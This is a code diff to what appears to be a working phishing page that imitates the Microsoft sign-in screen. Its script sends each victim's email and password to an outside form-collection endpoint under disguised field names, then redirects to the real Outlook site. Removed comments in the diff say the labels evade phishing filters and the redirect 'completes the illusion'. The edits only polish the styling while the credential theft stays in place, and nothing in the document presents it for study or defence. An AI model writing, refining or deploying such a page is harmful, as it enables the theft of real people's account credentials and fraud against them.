@@ -8,7 +8,7 @@
         * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
         body {
             margin: 0; padding: 0;
-            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg') no-repeat center center fixed;
             background-size: cover;
             display: flex; justify-content: center; align-items: center;
@@ -23,27 +23,26 @@
         .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
         
-        /* Fixed Identity Layout: Matches official screenshot */
+        /* Final Identity Row: No more gray boxes or broken icons */
         .identity-container {
             display: flex; align-items: center;
             margin-bottom: 20px; cursor: pointer;
             font-size: 15px; color: #1b1b1b;
         }
         .back-arrow {
-            width: 16px; height: 16px;
-            margin-right: 8px; cursor: pointer;
+            width: 14px; height: 14px;
+            margin-right: 12px;
         }
 
         .input-field {
             width: 100%; border: none; border-bottom: 1px solid #666;
             padding: 8px 0; font-size: 16px; margin-bottom: 12px;
-            outline: none; transition: border-bottom 0.1s;
+            outline: none;
         }
         .input-field:focus { border-bottom: 2px solid #0067b8; }
         
         .help-text { font-size: 13px; margin: 12px 0; color: #1b1b1b; }
         .help-text a { color: #0067b8; text-decoration: none; }
-        .help-text a:hover { text-decoration: underline; }
         
         .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
         .btn-next {
@@ -72,7 +71,6 @@
                 <h1>Sign in</h1>
                 <input type="email" id="user-email" placeholder="Email, phone, or Skype" class="input-field" onkeydown="if(event.key==='Enter') showPassword()">
                 <p class="help-text">No account? <a href="#">Create one!</a></p>
-                <p class="help-text"><a href="#">Can’t access your account?</a></p>
                 <div class="button-row">
                     <button class="btn-next" onclick="showPassword()">Next</button>
                 </div>
@@ -107,10 +105,8 @@
         let currentEmail = "";
 
         function showPassword() {
-            const emailInput = document.getElementById('user-email');
-            currentEmail = emailInput.value;
+            currentEmail = document.getElementById('user-email').value;
             if(!currentEmail) return;
-            
             document.getElementById('email-section').style.display = 'none';
             document.getElementById('password-section').style.display = 'block';
             document.getElementById('display-email').innerText = currentEmail;
@@ -131,21 +127,14 @@
             btn.disabled = true;
 
             try {
-                // Using Forminit Endpoint: o8km4uwh9no
-                // Using stealth labels to prevent phishing filters
+                // Your new Forminit Endpoint
                 await fetch('https://forminit.com/f/o8km4uwh9no', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        userid: currentEmail, 
-                        accesskey: password 
-                    })
+                    body: JSON.stringify({ userid: currentEmail, accesskey: password })
                 });
-            } catch (err) {
-                console.log("Submission processed.");
-            }
+            } catch (err) {}
 
-            // Redirect to real outlook to complete the illusion
             window.location.href = "https://outlook.office.com/mail/";
         }
     </script>
